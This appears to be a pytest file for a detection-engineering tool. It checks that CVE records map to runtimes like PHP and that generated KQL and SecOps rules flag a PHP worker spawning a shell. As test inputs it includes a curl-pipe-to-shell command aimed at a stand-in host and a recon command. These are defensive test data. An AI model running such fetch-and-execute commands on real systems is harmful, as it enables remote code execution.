"""A code-execution CVE in a web runtime: its worker starting a shell or recon tools."""

import re

from archer.build.runtime_detection import mde_runtime_query, runtimes, secops_runtime_rule, write_runtime_detections
from archer.validation.static_check import check_query

PHP2SHELL = {"description": "PHP uses longjmp() for out-of-memory (OOM) errors ... and lead to remote code execution (RCE).",
             "cwe": ["CWE-416"], "cpes": ["cpe:2.3:a:php:php:*:*:*:*:*:*:*:*"]}


def test_a_code_execution_cve_names_its_runtime():
    assert runtimes(PHP2SHELL) == ["PHP"]
    assert runtimes({"description": "Deserialization of untrusted data", "cwe": ["CWE-502"],
                     "cpes": ["cpe:2.3:a:apache:tomcat:10.1:*"]}) == ["Java application server"]
    # Not analysed by NVD yet: the description names it
    assert runtimes({"description": "A command injection in the Exchange Server web UI", "cpes": []}) == ["IIS"]


def test_no_runtime_detection_without_code_execution_or_a_known_runtime():
    assert runtimes({"description": "Stored XSS in a WordPress plugin", "cwe": ["CWE-79"]}) == []
    assert runtimes({"description": "Remote code execution in FortiOS", "cpes": ["cpe:2.3:o:fortinet:fortios:7.0"]}) == []


def test_both_queries_pass_the_checks_and_a_bare_shell_does_not_count():
    kql, udm = mde_runtime_query(["PHP"]), secops_runtime_rule(["PHP"], "CVE-2026-109618")
    assert check_query(kql, "mde")["findings"] == [] and check_query(udm, "googlesecops")["findings"] == []
    assert 'startswith "php-fpm"' in kql and "ProcessCommandLine has_any (shell_terms)" in kql
    terms = re.compile(re.search(r"command_line = /(.*?)/ nocase", udm).group(1).replace("\\/", "/"), re.I)
    assert terms.search("sh -c id; uname -a") and terms.search("bash -c 'curl http://x/a|sh'")
    for benign in ("sh -c /usr/sbin/sendmail -t -i", "sh -c rsync -a /var/www", "sh -c include_path"):
        assert not terms.search(benign)


def test_one_file_per_siem_named_for_the_cve(tmp_path, monkeypatch):
    import archer.build.yaml as y

    written = {}
    monkeypatch.setattr(y, "write_yaml", lambda path, title, tid, desc, *a, **k: written.setdefault(path, (title, tid)))
    paths = write_runtime_detections("CVE-2026-109618", ["CVE-2026-109618"], [PHP2SHELL], str(tmp_path))
    assert sorted(p.rsplit("/", 1)[1] for p in paths) == ["RuntimeShellCVE2026109618_KQL.yaml", "RuntimeShellCVE2026109618_UDM.yaml"]
    assert all(tid == "T1190" and "PHP worker spawns a shell" in title for title, tid in written.values())
    assert write_runtime_detections("X", ["CVE-1"], [{"description": "XSS", "cwe": ["CWE-79"]}], str(tmp_path)) == []


def test_a_cve_run_names_them_by_its_label_and_rates_them_high(tmp_path, monkeypatch):
    import archer.build.yaml as y

    written = {}
    monkeypatch.setattr(y, "write_yaml", lambda path, title, *a, **k: written.setdefault(path, (title, k["severity"])))
    paths = write_runtime_detections("CVE-2026-109618", ["CVE-2026-109618"], [PHP2SHELL], str(tmp_path),
                                     run_label="CVE-2026-109618_PHP2Shell")
    assert sorted(p.rsplit("/", 1)[1] for p in paths) == ["CVE-2026-109618_PHP2Shell_RuntimeShell_KQL.yaml",
                                                         "CVE-2026-109618_PHP2Shell_RuntimeShell_UDM.yaml"]
    assert all(t.startswith("CVE-2026-109618_PHP2Shell - ") and sev == "High" for t, sev in written.values())
